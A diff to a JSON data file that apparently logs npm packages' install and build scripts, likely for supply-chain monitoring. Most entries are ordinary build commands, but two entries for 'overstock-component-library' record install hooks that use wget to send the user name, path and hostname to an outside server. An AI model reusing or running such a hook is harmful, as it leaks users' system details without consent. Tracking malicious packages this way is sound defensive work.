@@ -1,5 +1,50 @@
 [
   {
+    "packageName": "overstock-component-library",
+    "version": "4.2.3",
+    "scriptType": "postinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T21:15:43.342Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-component-library",
+    "version": "4.2.3",
+    "scriptType": "preinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T21:15:43.341Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "dcos-auth-client-lib",
+    "version": "1.0.0",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T21:15:32.129Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "sarvam-convai-embed",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T21:14:11.809Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "tw-mrg",
+    "version": "1.0.1",
+    "scriptType": "prebuild",
+    "scriptContent": "node scripts/bundle-tailwind-css.js",
+    "previousVersion": "1.0.0",
+    "timestamp": "2026-01-23T21:13:03.041Z",
+    "issuesend": true
+  },
+  {
     "packageName": "hammer-jquery",
     "version": "99.0.0",
     "scriptType": "postinstall",
